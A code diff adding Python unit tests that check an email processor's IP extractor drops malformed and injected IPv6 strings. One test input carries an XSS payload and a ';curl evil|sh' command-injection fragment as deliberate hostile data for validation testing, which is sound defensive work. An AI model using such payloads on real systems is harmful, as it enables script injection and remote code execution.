@@ -1,3 +1,4 @@
+import socket
 import tempfile
 from email.message import Message
 from pathlib import Path
@@ -278,6 +279,37 @@ def test_get_ips_invalid(
     file_data = "Invalid: 999.999.999.999"
     processor._get_ips(file_data, ips)
     assert "999.999.999.999" not in ips
+
+
+def test_get_ips_rejects_ipv6_scope_injection(
+    mock_context: ProcessEmailContext, email_config: dict[str, bool]
+) -> None:
+    """Reject IPv6 regex matches that contain an injected scope suffix."""
+    processor = EmailProcessor(mock_context, email_config)
+    ips: set[str] = set()
+    invalid_scoped = "fe80::1%eth0"
+    injected = "fe80::1%eth0'\"><img src=x onerror=alert(1)>;curl evil|sh"
+
+    processor._get_ips(invalid_scoped, ips)
+    processor._get_ips(injected, ips)
+
+    assert invalid_scoped not in ips
+    assert injected not in ips
+    for candidate in ips:
+        socket.inet_pton(socket.AF_INET6, candidate)
+
+
+def test_get_ips_rejects_socket_invalid_ipv6(
+    mock_context: ProcessEmailContext, email_config: dict[str, bool]
+) -> None:
+    """Discard IPv6 candidates rejected by the operating-system parser."""
+    processor = EmailProcessor(mock_context, email_config)
+    ips: set[str] = set()
+
+    with patch("soar_sdk.extras.email.processor.socket.inet_pton", side_effect=OSError):
+        processor._get_ips("2001:db8::1", ips)
+
+    assert not ips
 
 
 def test_extract_urls_domains_disabled(mock_context: ProcessEmailContext) -> None:
